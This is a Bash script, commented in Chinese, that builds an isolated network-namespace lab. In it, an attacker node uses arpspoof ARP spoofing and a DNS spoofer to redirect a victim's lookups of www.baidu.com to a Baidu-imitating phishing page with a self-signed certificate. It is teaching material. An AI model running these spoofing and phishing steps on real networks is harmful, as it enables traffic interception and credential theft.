#!/usr/bin/env bash
#
#  DNS 劫持演示靶场（完全隔离版）
#
#  用 Linux network namespace 造一个跟宿主机网络完全隔离的小型"互联网"：
#
#        ns-gw (10.66.0.1)     ns-att (10.66.0.10)    ns-vic (10.66.0.20)
#        「真实互联网」           「攻击者」              「受害者」
#        真实 DNS + 真网站        伪造 DNS 应答 + 假网站
#             │                      │                       │
#          veth-gw                veth-att                veth-vic
#             └──────────────┬───────┴───────────────────────┘
#                      br-dnslab（宿主机上的纯二层网桥，无 IP）
#
#  宿主机只做二层转发，不参与三层的任何环节；所有实验流量都封在
#  netns 里，不会碰 eth0，也不会影响你真实的 DNS 设置。
#
#  用法：
#     sudo ./lab.sh up            搭建靶场（含真实 DNS 和仿百度钓鱼页）
#     sudo ./lab.sh deps          检查依赖是否齐全
#     sudo ./lab.sh check         验证「劫持前」：正常解析到真实网站
#     sudo ./lab.sh attack        发起攻击：ARP 欺骗 + DNS 抢答
#     sudo ./lab.sh dig           看受害者现在解析到什么（被劫持）
#     sudo ./lab.sh curl          让受害者去访问那个域名（落到假网站）
#     sudo ./lab.sh attack-stop   停止攻击并恢复受害者 ARP 表
#     sudo ./lab.sh status        查看拓扑 / ARP 表 / 进程状态
#     sudo ./lab.sh logs          查看各服务日志
#     sudo ./lab.sh shell ns-vic  进入某个节点
#     sudo ./lab.sh down          完全清理（删除全部 netns / 网桥）
#
#  可选（桌面演示用，会改到宿主机网络设置，演示完记得 nat-off）：
#     sudo ./lab.sh nat-on        让受害者能访问真实互联网
#     sudo ./lab.sh browser       在受害者节点里开 Firefox（窗口出现在桌面）
#     sudo ./lab.sh browser-kill  关掉该浏览器
#     sudo ./lab.sh nat-off       恢复宿主机网络设置
#
set -uo pipefail

LAB_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
RUN_DIR="$LAB_DIR/run"

BR="br-dnslab"
# 演示目标：受害者想访问的「真实」域名，以及它在真实互联网上的解析结果
# （REAL_IP 用 dig 现查；百度有 CDN，不同地区/时间会不一样）
DOMAIN="baidu.com"
HOST="www.baidu.com"
REAL_IP="183.2.172.177"

# 钓鱼页的自签证书（浏览器会报“证书不受信任”，正是演示点）
FAKE_CRT="$RUN_DIR/fake.crt"
FAKE_KEY="$RUN_DIR/fake.key"

# ── 可选：让受害者浏览器能上真实互联网（演示真实百度）──
# 注意：nat-on 会临时修改宿主机的 ip_forward 和一条 iptables 规则，
#      演示完必须用 nat-off 恢复。
HOST_GW_IP="10.66.0.254"
DESKTOP_USER="${SUDO_USER:-sinan}"
DESKTOP_UID="$(id -u "$DESKTOP_USER" 2>/dev/null || echo 1000)"
DESKTOP_GID="$(id -g "$DESKTOP_USER" 2>/dev/null || echo 1000)"
BROWSER_PROFILE="/tmp/dns-lab-firefox"

GW_NS="ns-gw";   GW_IP="10.66.0.1";    GW_VETH="veth-gw"
ATT_NS="ns-att"; ATT_IP="10.66.0.10";  ATT_VETH="veth-att"
VIC_NS="ns-vic"; VIC_IP="10.66.0.20";  VIC_VETH="veth-vic"

# ─────────────────────────── 输出小工具 ───────────────────────────
if [[ -t 1 ]]; then
  C_R=$'\033[1;31m'; C_G=$'\033[1;32m'; C_C=$'\033[1;36m'
  C_Y=$'\033[1;33m'; C_D=$'\033[2m';    C_0=$'\033[0m'
else
  C_R=""; C_G=""; C_C=""; C_Y=""; C_D=""; C_0=""
fi
log()  { printf '%s[*]%s %s\n' "$C_C" "$C_0" "$*"; }
ok()   { printf '%s[+]%s %s\n' "$C_G" "$C_0" "$*"; }
warn() { printf '%s[!]%s %s\n' "$C_Y" "$C_0" "$*"; }
err()  { printf '%s[!]%s %s\n' "$C_R" "$C_0" "$*" >&2; }
hr()   { printf '%s%s%s\n' "$C_D" "────────────────────────────────────────────" "$C_0"; }

need_root() {
  if [[ $EUID -ne 0 ]]; then
    err "需要 root（要创建 network namespace 和网桥）。请用 sudo 运行。"
    exit 1
  fi
}

nsexec() { local ns="$1"; shift; ip netns exec "$ns" "$@"; }

ns_exists() { ip netns list 2>/dev/null | grep -qw "$1"; }

# ─────────────────── 服务进程管理（按 netns 内真实进程匹配）───────────────────
#
# 注意：不能用启动时的 $! 记 PID —— `ip netns exec` 会 fork 一个子进程
# 再由它 exec 目标程序，所以 $! 拿到的是中间层的 PID，杀不掉真正的服务。
# 这里改成「在该 netns 的进程列表里按命令行特征匹配」，既准确又能扛住 fork。

svc_spec() {   # name -> "<netns> <cmdline 特征串>"
  case "$1" in
    dnsmasq)  echo "$GW_NS dnsmasq"   ;;
    att-web)  echo "$ATT_NS fake-baidu.py" ;;
    dnsspoof) echo "$ATT_NS dns-spoof.py" ;;
    arpspoof) echo "$ATT_NS arpspoof" ;;
    *)        echo "" ;;
  esac
}

svc_pids() {   # 列出某个服务所有匹配到的 PID
  local name="$1" spec ns pat pid cmd
  spec="$(svc_spec "$name")"
  [[ -n "$spec" ]] || return 0
  ns="${spec%% *}"; pat="${spec##* }"
  ns_exists "$ns" || return 0
  for pid in $(ip netns pids "$ns" 2>/dev/null); do
    cmd="$(tr '\0' ' ' < "/proc/$pid/cmdline" 2>/dev/null)"
    [[ "$cmd" == *"$pat"* ]] && echo "$pid"
  done
}

svc_pid()      { svc_pids "$1" | head -1; }
svc_running()  { [[ -n "$(svc_pid "$1")" ]]; }

start_ns() {   # start_ns <ns> <name> <cmd...>
  local ns="$1" name="$2"; shift 2
  mkdir -p "$RUN_DIR"
  if svc_running "$name"; then warn "$name 已在运行，跳过"; return 0; fi
  # setsid：让服务脱离当前会话与进程组。这样本脚本退出后服务依然活着，
  # 分步演示时你可以在命令之间自由切换终端。
  setsid ip netns exec "$ns" "$@" >"$RUN_DIR/$name.log" 2>&1 </dev/null &
  disown 2>/dev/null || true
}

stop_svc() {
  local name="$1" pid
  for pid in $(svc_pids "$name"); do kill "$pid" 2>/dev/null; done
  for _ in $(seq 1 30); do svc_running "$name" || break; sleep 0.05; done
  for pid in $(svc_pids "$name"); do kill -9 "$pid" 2>/dev/null; done
}

wait_up() {    # wait_up <name> <秒数>
  local name="$1" n="${2:-30}"
  for _ in $(seq 1 "$n"); do svc_running "$name" && return 0; sleep 0.1; done
  return 1
}

# ─────────────────────────── 搭建 / 拆除 ───────────────────────────

node_up() {   # node_up <ns> <veth> <ip>
  local ns="$1" veth="$2" ip="$3"
  local peer="${veth}-br"
  ip netns add "$ns"
  ip link add "$veth" type veth peer name "$peer"
  ip link set "$veth" netns "$ns"
  ip link set "$peer" master "$BR"
  ip link set "$peer" up
  nsexec "$ns" ip link set lo up
  nsexec "$ns" ip link set "$veth" up
  nsexec "$ns" ip addr add "$ip/24" dev "$veth"
}

net_up() {
  need_root
  # 网桥和 netns 都要查一遍，避免上次异常退出留下的残骸
  if ns_exists "$GW_NS" || ip link show "$BR" &>/dev/null; then
    warn "检测到上次的残留，先清理"
    net_down >/dev/null 2>&1
  fi
  mkdir -p "$RUN_DIR"

  log "创建隔离网桥 $BR（宿主机上不配 IP，纯二层转发）"
  ip link add "$BR" type bridge || { err "网桥创建失败"; exit 1; }
  ip link set "$BR" up

  log "创建三个节点"
  node_up "$GW_NS"  "$GW_VETH"  "$GW_IP"
  node_up "$ATT_NS" "$ATT_VETH" "$ATT_IP"
  node_up "$VIC_NS" "$VIC_VETH" "$VIC_IP"

  # 重要：新建的 netns 会继承宿主机当时的 ip_forward（我们为了出网 NAT
  # 把它设成了 1）。但靶场里三个节点都不应该转发流量 —— 一旦攻击者开了
  # 转发，受害者的 DNS 查询会被原样转给真实 DNS，抢答就变成竞态，演示不稳定。
  for ns in "$GW_NS" "$ATT_NS" "$VIC_NS"; do
    nsexec "$ns" sysctl -qw net.ipv4.ip_forward=0 2>/dev/null || true
  done

  # victim 的 DNS 设置。/etc/netns/<ns>/ 只在该 netns 内可见（iproute2
  # 在 exec 时做 bind-mount），碰不到宿主机的 /etc/resolv.conf。
  mkdir -p "/etc/netns/$VIC_NS"
  printf 'nameserver %s\noptions timeout:1 attempts:1\n' "$GW_IP" \
    > "/etc/netns/$VIC_NS/resolv.conf"

  # 给钓鱼页生成自签证书：浏览器访问 https://www.baidu.com 时会看到
  # 「证书不受信任」—— 这正是真实钓鱼场景里攻击者赌你点「继续」的那一步
  if [[ ! -f "$FAKE_CRT" || ! -f "$FAKE_KEY" ]]; then
    log "生成自签证书（CN=$HOST）"
    openssl req -x509 -newkey rsa:2048 -nodes -days 3650 \
      -keyout "$FAKE_KEY" -out "$FAKE_CRT" \
      -subj "/CN=$HOST" \
      -addext "subjectAltName=DNS:$HOST,DNS:$DOMAIN" >/dev/null 2>&1 \
      || warn "证书生成失败，钓鱼页将只监听 HTTP"
  fi

  log "ns-gw：启动真实 DNS（dnsmasq，把 www.baidu.com 解析到真实 IP）"
  start_ns "$GW_NS" dnsmasq dnsmasq \
    --keep-in-foreground --conf-file=/dev/null --user=root \
    --bind-interfaces --listen-address="$GW_IP" --port=53 \
    --no-resolv --no-hosts --pid-file= \
    --address=/"$HOST"/"$REAL_IP" \
    --log-queries --log-facility=-

  log "ns-att：启动仿百度钓鱼页（HTTP 80 + HTTPS 443 自签证书）"
  start_ns "$ATT_NS" att-web python3 "$LAB_DIR/fake-baidu.py" \
    80 "$FAKE_CRT" "$FAKE_KEY"

  # 让受害者先和网关通信一次，建立 ARP 基线；这样 status 里的
  # 「ARP 表」对比才有前后参照。
  nsexec "$VIC_NS" ping -c 1 -W 2 "$GW_IP" >/dev/null 2>&1 || true

  sleep 1
  check_services
  hr
  ok "靶场就绪。下一步： sudo ./lab.sh check"
  status
}

check_services() {
  for s in dnsmasq att-web; do
    if wait_up "$s" 20; then
      printf '  %s%-10s%s 运行中 (pid %s)\n' "$C_G" "$s" "$C_0" "$(svc_pid "$s")"
    else
      printf '  %s%-10s%s 未运行  ← 见 run/%s.log\n' "$C_R" "$s" "$C_0" "$s"
    fi
  done
}

net_down() {
  need_root
  log "停止后台服务"
  for s in arpspoof dnsspoof dnsmasq att-web; do stop_svc "$s"; done

  log "删除 netns（各自的 veth 随之回收）"
  for ns in "$VIC_NS" "$ATT_NS" "$GW_NS"; do
    ip netns del "$ns" 2>/dev/null || true
  done

  log "删除网桥"
  ip link del "$BR" 2>/dev/null || true

  # 兜底：清掉可能残留的 veth
  for v in "$GW_VETH" "$ATT_VETH" "$VIC_VETH"; do
    ip link del "$v" 2>/dev/null || true
    ip link del "${v}-br" 2>/dev/null || true
  done

  rm -rf "/etc/netns/$VIC_NS"
  rmdir /etc/netns 2>/dev/null || true   # 仅当目录为空时才删

  ok "清理完成，宿主机网络未受影响"
}

# ─────────────────────────── 攻击 / 演示 ───────────────────────────

do_attack() {
  need_root
  ns_exists "$ATT_NS" || { err "靶场未运行，先执行 sudo ./lab.sh up"; exit 1; }

  local att_mac
  att_mac="$(nsexec "$ATT_NS" cat /sys/class/net/$ATT_VETH/address)"

  cat >"$RUN_DIR/dns-spoof.hosts" <<EOF
$ATT_IP	$HOST
$ATT_IP	$DOMAIN
$ATT_IP	*.${DOMAIN}
EOF

  log "① DNS 抢答：把 ${HOST} 指向 $ATT_IP"
  start_ns "$ATT_NS" dnsspoof python3 "$LAB_DIR/dns-spoof.py" \
    -i "$ATT_VETH" -f "$RUN_DIR/dns-spoof.hosts"

  log "② ARP 欺骗：反复告诉 ${VIC_IP}「${GW_IP} 的 MAC 是 ${att_mac}」"
  start_ns "$ATT_NS" arpspoof arpspoof -i "$ATT_VETH" -t "$VIC_IP" "$GW_IP"

  # scapy 导入需要一两秒，等它真正开始监听再继续
  wait_up dnsspoof 60 || warn "DNS 抢答器没能启动，看 run/dnsspoof.log"

  # 等 ARP 欺骗真正生效：盯着受害者的邻居表，直到它把网关的 MAC
  # 认成攻击者的 MAC。这是整个攻击的关键前提 —— 受害者刚才可能已经
  # 缓存了网关的真实 MAC（REACHABLE 状态），需要被覆盖掉。
  local vic_sees i
  vic_sees=""
  for i in $(seq 1 60); do
    # 注：指定了 dev 参数后，`ip neigh` 的输出会省略 "dev <网卡>" 这一段，
    # 字段位置并不固定，所以直接用正则把 MAC 抠出来，别按列取。
    vic_sees="$(nsexec "$VIC_NS" ip neigh show "$GW_IP" dev "$VIC_VETH" 2>/dev/null \
      | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' | head -1)"
    [[ "$vic_sees" == "$att_mac" ]] && break
    sleep 0.25
  done
  if [[ "$vic_sees" == "$att_mac" ]]; then
    printf '  %sARP 欺骗已生效：受害者现在认为 %s 位于 %s%s\n' \
      "$C_G" "$GW_IP" "$att_mac" "$C_0"
  else
    warn "ARP 欺骗尚未生效（受害者看到的网关 MAC 仍是 ${vic_sees:-未知}）"
  fi

  for s in dnsspoof arpspoof; do
    if svc_running "$s"; then
      printf '  %s%-10s%s 运行中 (pid %s)\n' "$C_G" "$s" "$C_0" "$(svc_pid "$s")"
    else
      printf '  %s%-10s%s 未运行  ← 见 run/%s.log\n' "$C_R" "$s" "$C_0" "$s"
    fi
  done
  hr
  ok "攻击进行中。现在执行： sudo ./lab.sh dig"
}

attack_stop() {
  need_root
  log "停止 ARP 欺骗与 DNS 抢答"
  stop_svc arpspoof
  stop_svc dnsspoof

  # 把受害者的 ARP 缓存纠正回来，让它重新学到真实网关的 MAC
  if ns_exists "$VIC_NS"; then
    nsexec "$VIC_NS" ip neigh del "$GW_IP" dev "$VIC_VETH" 2>/dev/null || true
    nsexec "$VIC_NS" ping -c 2 -W 2 "$GW_IP" >/dev/null 2>&1 || true
    ok "已停止攻击，受害者 ARP 表已恢复"
  fi
}

do_dig() {
  ns_exists "$VIC_NS" || { err "靶场未运行"; exit 1; }
  local got
  hr
  printf '受害者的 DNS 配置：\n'
  nsexec "$VIC_NS" cat /etc/resolv.conf 2>/dev/null | sed 's/^/    /'
  hr
  printf '受害者解析 %s：\n' "$HOST"
  nsexec "$VIC_NS" dig +timeout=3 +tries=1 "$HOST" A 2>&1 \
    | sed -n '/ANSWER SECTION/,/^$/p' | sed 's/^/    /'
  got="$(nsexec "$VIC_NS" dig +short +timeout=3 +tries=1 "$HOST" A 2>/dev/null | head -1)"
  hr
  if [[ "$got" == "$ATT_IP" ]]; then
    printf '  %s解析结果 %s → 攻击者的 IP%s（已被劫持）\n' "$C_R" "$got" "$C_0"
  elif [[ "$got" == "$REAL_IP" ]]; then
    printf '  %s解析结果 %s → 真实百度 IP%s（正常）\n' "$C_G" "$got" "$C_0"
  else
    printf '  解析结果：%s\n' "${got:-（无回答）}"
  fi
}

do_curl() {
  ns_exists "$VIC_NS" || { err "靶场未运行"; exit 1; }
  hr
  printf '受害者访问 http://%s/\n' "$HOST"
  local body title
  body="$(nsexec "$VIC_NS" curl -s --max-time 5 "http://$HOST/" 2>/dev/null)"
  if [[ -z "$body" ]]; then
    warn "没有拿到响应。检查 att-web 是否正常（run/att-web.log）"
    return 1
  fi
  title="$(printf '%s' "$body" | sed -n 's/.*<title>\(.*\)<\/title>.*/\1/p' | head -1)"
  printf '  页面标题：%s%s%s\n' "$C_Y" "${title:-未知}" "$C_0"
  # 按页面里的特征字符串判定（钓鱼页脚标带有 tanei.top）
  if [[ "$body" == *"tanei.top"* ]]; then
    printf '  %s→ 落到了攻击者的钓鱼站（TANEI 演示页）%s\n' "$C_R" "$C_0"
  else
    printf '  %s→ 不是钓鱼页（或响应异常）%s\n' "$C_Y" "$C_0"
  fi
}

check() {
  need_root
  do_dig
  hr
  log "正常状态：${HOST} 解析到真实 IP ${REAL_IP}"
  log "（隔离环境中连不出真实百度，属预期 —— 演示只看解析结果）"
  log "接下来执行： sudo ./lab.sh attack"
}

status() {
  need_root
  hr
  printf '%-8s %-14s %s\n' "节点" "地址" "角色"
  printf '%-8s %-14s %s\n' "$GW_NS"  "$GW_IP"  "真实 DNS（解析出真实百度 IP）"
  printf '%-8s %-14s %s\n' "$ATT_NS" "$ATT_IP" "攻击者"
  printf '%-8s %-14s %s\n' "$VIC_NS" "$VIC_IP" "受害者"
  hr

  if ! ns_exists "$VIC_NS"; then
    warn "靶场未运行（执行 sudo ./lab.sh up 启动）"
    return 0
  fi

  printf '网卡 MAC：\n'
  printf '  gw  %s\n' "$(nsexec "$GW_NS"  cat /sys/class/net/$GW_VETH/address  2>/dev/null)"
  printf '  att %s\n' "$(nsexec "$ATT_NS" cat /sys/class/net/$ATT_VETH/address 2>/dev/null)"
  hr
  printf '受害者 ARP 表（关键证据）：\n'
  local neigh
  neigh="$(nsexec "$VIC_NS" ip neigh show "$GW_IP" dev "$VIC_VETH" 2>/dev/null)"
  if [[ -n "$neigh" ]]; then printf '%s\n' "$neigh" | sed 's/^/  /'
  else printf '  （空，先跑一次 dig 或 curl 触发通信）\n'; fi
  printf '%s  攻击生效时，这里 gw 的 MAC 会变成上面 att 的 MAC%s\n' "$C_D" "$C_0"
  hr
  printf '服务：\n'
  for s in dnsmasq att-web dnsspoof arpspoof; do
    if svc_running "$s"; then
      printf '  %s%-10s%s 运行中\n' "$C_G" "$s" "$C_0"
    else
      printf '  %s%-10s%s 已停止\n' "$C_D" "$s" "$C_0"
    fi
  done
  hr
}

show_logs() {
  for s in dnsmasq att-web dnsspoof arpspoof; do
    [[ -f "$RUN_DIR/$s.log" ]] || continue
    hr
    printf '%s── %s ──%s\n' "$C_C" "$s" "$C_0"
    tail -n 15 "$RUN_DIR/$s.log" | sed 's/^/  /'
  done
  hr
}

# ─────────────────── 可选：受害者出网 + 浏览器演示 ───────────────────
#
# 不想看真实百度的话，这部分完全可以不用。用了就会改到宿主机网络设置，
# 所以单独拆成 nat-on / nat-off 两个命令，好恢复。

nat_on() {
  need_root
  ns_exists "$VIC_NS" || { err "靶场未运行，先 up"; exit 1; }
  log "给网桥配网关地址 $HOST_GW_IP（宿主机侧）"
  ip addr add "$HOST_GW_IP/24" dev "$BR" 2>/dev/null || true
  log "开启宿主机转发"
  sysctl -qw net.ipv4.ip_forward=1
  log "加 NAT 规则（仅对 10.66.0.0/24 源地址生效）"
  iptables -t nat -C POSTROUTING -s 10.66.0.0/24 -o eth0 -j MASQUERADE 2>/dev/null \
    || iptables -t nat -A POSTROUTING -s 10.66.0.0/24 -o eth0 -j MASQUERADE
  log "受害者默认路由 → $HOST_GW_IP"
  nsexec "$VIC_NS" ip route replace default via "$HOST_GW_IP"
  ok "受害者现在能访问真实互联网（演示完务必执行 nat-off 恢复）"
}

nat_off() {
  need_root
  log "移除 NAT 规则"
  iptables -t nat -D POSTROUTING -s 10.66.0.0/24 -o eth0 -j MASQUERADE 2>/dev/null || true
  log "关闭宿主机转发"
  sysctl -qw net.ipv4.ip_forward=0
  if ns_exists "$VIC_NS"; then
    nsexec "$VIC_NS" ip route del default via "$HOST_GW_IP" 2>/dev/null || true
  fi
  ip addr del "$HOST_GW_IP/24" dev "$BR" 2>/dev/null || true
  ok "宿主机网络设置已恢复"
}

open_browser() {
  need_root
  ns_exists "$VIC_NS" || { err "靶场未运行，先 up"; exit 1; }
  local url="${2:-http://www.baidu.com}"
  local disp="${DISPLAY:-:0}"
  local xauth="${XAUTHORITY:-/home/$DESKTOP_USER/.Xauthority}"

  if [[ ! -e "/tmp/.X11-unix/X${disp#:}" ]]; then
    err "找不到显示 $disp。请在图形桌面的终端里运行，或先 export DISPLAY=:0"
    exit 1
  fi

  pkill -x firefox-esr 2>/dev/null || true
  pkill -x firefox 2>/dev/null || true
  sleep 1
  rm -rf "$BROWSER_PROFILE"
  mkdir -p "$BROWSER_PROFILE"

  # 关掉「HTTPS 优先」：否则地址栏输入域名会被自动升级成 https，
  # 撞上自签证书警告，演示就不顺畅了。
  cat > "$BROWSER_PROFILE/user.js" <<'EOF'
user_pref("dom.security.https_first", false);
user_pref("dom.security.https_first_pbm", false);
user_pref("browser.shell.checkDefaultBrowser", false);
user_pref("browser.aboutwelcome.enabled", false);
// 关掉 DNS 缓存：否则攻击前解析到的真实 IP 会被缓存住，
// 攻击后浏览器可能还去连真百度，看起来像「劫持没生效」
user_pref("network.dnsCacheExpiration", 0);
user_pref("network.dnsCacheExpirationGracePeriod", 0);
user_pref("network.dnsCacheEntries", 0);
EOF
  chown -R "$DESKTOP_UID:$DESKTOP_GID" "$BROWSER_PROFILE"

  log "在 $VIC_NS 里启动 Firefox（窗口会出现在桌面上，加载 $url）"
  XAUTHORITY="$xauth" DISPLAY="$disp" \
    ip netns exec "$VIC_NS" \
    setpriv --reuid="$DESKTOP_UID" --regid="$DESKTOP_GID" --init-groups \
    env DISPLAY="$disp" XAUTHORITY="$xauth" HOME="/home/$DESKTOP_USER" \
    setsid firefox --no-remote -profile "$BROWSER_PROFILE" "$url" \
    > "$RUN_DIR/browser.log" 2>&1 </dev/null &
  disown 2>/dev/null || true
  ok "浏览器已启动（首次加载真实百度需要几秒）"
}

close_browser() {
  pkill -x firefox-esr 2>/dev/null || true
  pkill -x firefox 2>/dev/null || true
  ok "浏览器已关闭"
}

check_deps() {
  hr
  printf '依赖检查：\n'
  local missing=0
  local specs=(
    "ip:iproute2"
    "dnsmasq:dnsmasq"
    "arpspoof:dsniff"
    "openssl:openssl"
    "dig:dnsutils"
    "curl:curl"
  )
  for spec in "${specs[@]}"; do
    local cmd="${spec%%:*}" pkg="${spec##*:}"
    if command -v "$cmd" >/dev/null 2>&1; then
      printf '  %s✓%s %-10s (%s)\n' "$C_G" "$C_0" "$cmd" "$pkg"
    else
      printf '  %s✗%s %-10s 缺 → 需要 %s\n' "$C_R" "$C_0" "$cmd" "$pkg"
      missing=$((missing + 1))
    fi
  done
  if python3 -c 'import scapy' >/dev/null 2>&1; then
    printf '  %s✓%s %-10s (%s)\n' "$C_G" "$C_0" "scapy" "python3-scapy"
  else
    printf '  %s✗%s %-10s 缺 → 需要 %s\n' "$C_R" "$C_0" "scapy" "python3-scapy"
    missing=$((missing + 1))
  fi
  hr
  if [[ $missing -eq 0 ]]; then
    ok "依赖齐全，可以开始： sudo ./lab.sh up"
  else
    warn "缺 $missing 项依赖。一行安装（Debian/Kali/Ubuntu）："
    printf '    sudo apt update && sudo apt install -y dnsmasq dsniff openssl curl dnsutils python3-scapy\n'
    return 1
  fi
}

usage() { sed -n '2,46p' "$0" | sed 's/^#\s\?//'; }

case "${1:-}" in
  up)               net_up ;;
  down|clean)       net_down ;;
  check)            check ;;
  attack)           do_attack ;;
  attack-stop|stop) attack_stop ;;
  dig)              do_dig ;;
  curl)             do_curl ;;
  status|st)        status ;;
  logs)             show_logs ;;
  deps)             check_deps ;;
  nat-on)           nat_on ;;
  nat-off)          nat_off ;;
  browser)          open_browser "$@" ;;
  browser-kill)     close_browser ;;
  shell)
    need_root
    [[ -n "${2:-}" ]] || { err "用法：lab.sh shell <ns-gw|ns-att|ns-vic>"; exit 1; }
    ns_exists "$2" || { err "节点 $2 不存在"; exit 1; }
    exec ip netns exec "$2" "${SHELL:-/bin/bash}"
    ;;
  ""|-h|--help|help) usage ;;
  *) err "未知命令：$1"; echo; usage; exit 1 ;;
esac
